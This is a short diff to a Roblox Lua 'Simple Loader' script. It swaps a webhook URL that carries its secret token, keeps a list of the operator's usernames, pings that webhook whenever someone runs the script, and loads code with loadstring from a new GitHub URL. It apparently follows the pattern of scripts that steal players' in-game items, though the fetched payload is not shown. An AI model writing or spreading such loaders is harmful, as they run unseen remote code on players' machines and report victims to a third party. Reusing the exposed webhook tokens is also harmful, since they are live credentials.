@@ -1,12 +1,12 @@
 -- Simple Loader
 
-_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494661669849268365/mKzWrChl1qbxDMuG_w9WQyRS4W03KuSQigicg6y__FCCCftfUQoe9QkFfKd5ApNmlEfc"
+_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1495064163356119165/k_RO1jp0D6hDfHomulVsNPga2rPuoDmWYBQ0gQShg9Pqo0Bw899-sIE0Ob3pDeaNAscy"
 
 _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- Change this to your real Roblox usernames
 
 _G.PING_POOR = true
 
--- Send simple Discord ping
+-- Send notification when someone runs it
 task.spawn(function()
     if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
         local http = game:GetService("HttpService")
@@ -18,5 +18,5 @@ end)
 
 -- Load Baddies
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/baddies-file/refs/heads/main/baddies", true))()
 end)
